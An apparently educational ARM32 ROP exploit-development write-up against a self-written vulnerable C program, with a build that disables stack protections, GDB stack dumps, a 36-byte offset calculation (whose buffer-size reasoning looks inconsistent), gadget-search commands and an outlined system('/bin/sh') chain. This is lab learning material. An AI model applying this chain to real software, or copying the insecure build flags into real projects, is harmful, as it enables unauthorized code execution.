# ARM32 ROP Exploit Project

## Overview
This project demonstrates a practical Return-Oriented Programming (ROP) exploit on an ARM32 Linux environment using Termux on Android. The goal is to exploit a simple stack buffer overflow vulnerability in a custom C program to execute arbitrary code.

## Vulnerable Program
- A minimal C program (`vuln.c`) that reads input from `stdin` into a fixed size buffer without proper bounds checking, allowing for buffer overflow.
- Compiled with no stack protection, non PIE, and executable stack to facilitate exploitation.

### Compilation
Run `make` or:
```
gcc -marm -fno-stack-protector -z execstack -no-pie -g -o vuln vuln.c
```

## Testing Overflow
- The program accepts input from `stdin`.
- Use this command to trigger overflow with a controlled input size:
```
head -c 200 < /dev/zero | tr '\0' 'X' | ./vuln
```
- Confirm overflow by observing crash or abnormal behavior.

## Analysis with GDB
```
gdb ./vuln

(gdb) break fvuln
Breakpoint 1 at 0x104fc: file vuln.c, line 5

(gdb) run < <(head -c 200 < /dev/zero | tr '\0' 'X')
Starting program: /home/src/1v4n/rop/vuln < <(head -c 200 < /dev/zero | tr '\0' 'X')
proot warning: ptrace request 'PTRACE_???' not supported yet
proot warning: ptrace request 'PTRACE_GETVFPREGS' not supported yet
proot warning: ptrace request 'PTRACE_GET_THREAD_AREA' not supported yet
warning: File "/usr/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
        add-auto-load-safe-path /usr/lib/libthread_db.so.1
line to your configuration file "/root/.config/gdb/gdbinit".
To completely disable this security protection add
        set auto-load safe-path /
line to your configuration file "/root/.config/gdb/gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
        info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, fvuln (in=0xfffee708 'X' <repeats 200 times>) at vuln.c:5
5               printf("INPUT LEN: %zu\n", strlen(in));

(gdb) x/64x $sp
0xfffee6f0:     0xfffee708      0xfffee708      0x00000001      0x00011f14
0xfffee700:     0xfffee80c      0x000105c8      0x58585858      0x58585858
0xfffee710:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee720:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee730:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee740:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee750:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee760:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee770:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee780:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee790:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee7a0:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee7b0:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee7c0:     0x58585858      0x58585858      0x58585858      0x58585858
0xfffee7d0:     0xf7e6c700      0xf7fe5300      0x069691b4      0x0000001d
0xfffee7e0:     0xf7fe5000      0xf63d4e2e      0xf7e65358      0xf7e63e18

(gdb) info frame
Stack level 0, frame at 0xfffee708:
 pc = 0x104fc in fvuln (vuln.c:5); saved pc = 0x105c8
 called by frame at 0xfffee810
 source language c.
 Arglist at 0xfffee704, args: in=0xfffee708 'X' <repeats 200 times>
 Locals at 0xfffee704, Previous frame's sp is 0xfffee708
 Saved registers:
  r11 at 0xfffee700, lr at 0xfffee704

(gdb) x/16xb 0xfffee700
0xfffee700:     0x0c    0xe8    0xfe    0xff    0xc8    0x05    0x01    0x00
0xfffee708:     0x58    0x58    0x58    0x58    0x58    0x58    0x58    0x58

(gdb) info registers r11 sp lr
r11            0xfffee704          4294895364
sp             0xfffee6f0          0xfffee6f0
lr             0x105c8             67016

(gdb) x/32x $r11-32
0xfffee6e4:     0xa0    0xb0    0xec    0xf7    0x01    0x00    0x00    0x00
0xfffee6ec:     0xa4    0x09    0x01    0x1f    0x08    0xe7    0xfe    0xff
0xfffee6f4:     0x08    0xe7    0xfe    0xff    0x01    0x00    0x00    0x00
0xfffee6fc:     0x14    0x1f    0x01    0x00    0x0c    0xe8    0xfe    0xff

(gdb) disas fvuln
Dump of assembler code for function fvuln:
   0x000104ec <+0>:     push    {r11, lr}
   0x000104f0 <+4>:     add     r11, sp, #4
   0x000104f4 <+8>:     sub     sp, sp, #16
   0x000104f8 <+12>:    str     r0, [r11, #-16]
=> 0x000104fc <+16>:    ldr     r0, [r11, #-16]
   0x00010500 <+20>:    bl      0x103c4 <strlen@plt>
   0x00010504 <+24>:    mov     r3, r0
   0x00010508 <+28>:    mov     r1, r3
   0x0001050c <+32>:    ldr     r3, [pc, #112]  @ 0x10584 <fvuln+152>
   0x00010510 <+36>:    add     r3, pc, r3
   0x00010514 <+40>:    mov     r0, r3
   0x00010518 <+44>:    bl      0x103a0 <printf@plt>
   0x0001051c <+48>:    mov     r3, #0
   0x00010520 <+52>:    str     r3, [r11, #-8]
   0x00010524 <+56>:    b       0x10558 <fvuln+108>
   0x00010528 <+60>:    ldr     r3, [r11, #-8]
   0x0001052c <+64>:    ldr     r2, [r11, #-16]
   0x00010530 <+68>:    add     r3, r2, r3
   0x00010534 <+72>:    ldrb    r3, [r3]
   0x00010538 <+76>:    mov     r1, r3
   0x0001053c <+80>:    ldr     r3, [pc, #68]   @ 0x10588 <fvuln+156>
   0x00010540 <+84>:    add     r3, pc, r3
   0x00010544 <+88>:    mov     r0, r3
   0x00010548 <+92>:    bl      0x103a0 <printf@plt>
   0x0001054c <+96>:    ldr     r3, [r11, #-8]
   0x00010550 <+100>:   add     r3, r3, #1
   0x00010554 <+104>:   str     r3, [r11, #-8]
   0x00010558 <+108>:   ldr     r0, [r11, #-16]
   0x0001055c <+112>:   bl      0x103c4 <strlen@plt>
   0x00010560 <+116>:   mov     r2, r0
   0x00010564 <+120>:   ldr     r3, [r11, #-8]
   0x00010568 <+124>:   cmp     r2, r3
   0x0001056c <+128>:   bhi     0x10528 <fvuln+60>
   0x00010570 <+132>:   mov     r0, #10
   0x00010574 <+136>:   bl      0x103d0 <putchar@plt>
   0x00010578 <+140>:   nop     {0}
   0x0001057c <+144>:   sub     sp, r11, #4
   0x00010580 <+148>:   pop     {r11, pc}
   0x00010584 <+152>:   andeq   r0, r0, r4, ror #2
   0x00010588 <+156>:   andeq   r0, r0, r4, asr #2
End of assembler dump.

(gdb) x/40x $sp
0xfffee6f0:     0x08    0xe7    0xfe    0xff    0x08    0xe7    0xfe    0xff
0xfffee6f8:     0x01    0x00    0x00    0x00    0x14    0x1f    0x01    0x00
0xfffee700:     0x0c    0xe8    0xfe    0xff    0xc8    0x05    0x01    0x00
0xfffee708:     0x58    0x58    0x58    0x58    0x58    0x58    0x58    0x58
0xfffee710:     0x58    0x58    0x58    0x58    0x58    0x58    0x58    0x58
```

### Detailed Understanding of Stack Frame Layout and Overflow Offset, Plus Next Steps for ROP Project

#### Stack Frame Layout Analysis

In the ARM32 environment, the function prologue sets up the stack frame roughly as follows:
```
push {r11, lr} ; Save frame pointer (r11) and link register (lr)
add r11, sp, #4 ; Set frame pointer based on stack pointer
sub sp, sp, #16 ; Reserve 16 bytes on stack for local variables (including buffer)
str r0, [r11, #-16] ; Store input pointer on stack frame
```


- The saved link register (return address) is stored at `[r11, #-4]` (0xfffee700).
- The frame pointer (r11) is at 0xfffee704.
- The local buffer (32 bytes) is stored in the reserved 16 bytes below `sp` following the prologue, starting near `sp` (`0xfffee6f0`).

Stack grows downward; addresses decrease as we go down.

The actual function stack layout (approximate addresses):

| Address    | Content                                     |
|------------|---------------------------------------------|
| 0xfffee700 | saved LR (return address)                   |
| 0xfffee704 | saved R11 (frame pointer)                   |
| 0xfffee6f0 | Buffer start (32 bytes of input)            |
| ...        | Lower stack space                            |

The overflow buffer begins at a lower address than the saved LR, so writing more than 32 bytes into the buffer will overflow upward into saved registers (r11 and lr).

#### Calculating Overflow Offset to Return Address

To overwrite the saved return address (`lr`, 4 bytes):

- Buffer size: 32 bytes
- Next saved register (r11): 4 bytes
- Then return address (lr): 4 bytes

**Total offset to overwrite return address = 32 + 4 = 36 bytes**

Thus, you need to send at least 36 bytes to reach the saved lr, and the **37th to 40th bytes** overwrite the return address.

#### Verifying Offset with a Pattern
```
printf 'A%.0s' {1..36} > prefix
printf 'B%.0s' {1..4} > overwrite
cat prefix overwrite | ./vuln
```

Run the program under GDB and check if the saved LR or PC registers contain `0x42424242` (ASCII 'BBBB' reflected in hex).

## Next Steps for ROP Exploit

1. **Gadget Hunting:**

Use tools like `ropper` or `objdump` to find ROP gadgets, especially ones that pop registers and return control:

```
ropper --file vuln --search "pop {r0, pc}"

arm-linux-gnueabi-objdump -d vuln | grep -E "pop.*pc|bx lr"
```


2. **Locate system() and "/bin/sh":**

Use GDB or symbol tools to find the address of `system()` and the "/bin/sh" string:

```
p system
find &system, +9999999, "/bin/sh"
```

3. **Construct ROP Chain:**

Payload = Padding (36 bytes) + Gadget address ("pop {r0, pc}") + Address of "/bin/sh" string + Address of `system()`.

4. **Craft payload and test:**

Pipe the crafted payload into the vulnerable program and verify if you gain control, e.g., by spawning a shell.

---
